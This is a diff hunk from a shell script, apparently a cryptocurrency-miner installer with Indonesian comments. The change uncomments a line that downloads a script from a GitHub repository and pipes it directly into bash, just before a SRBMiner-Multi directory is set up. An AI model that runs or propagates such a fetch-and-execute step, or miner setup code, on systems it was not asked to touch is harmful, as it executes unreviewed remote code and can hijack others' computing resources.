@@ -89,7 +89,7 @@ fi
 
 # Jalankan skrip dari GitHub
 echo "Menjalankan skrip dari GitHub..."
-# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash
+curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash
 
 # Nama folder miner
 MINER_DIR="$HOME/SRBMiner-Multi-2-7-5"
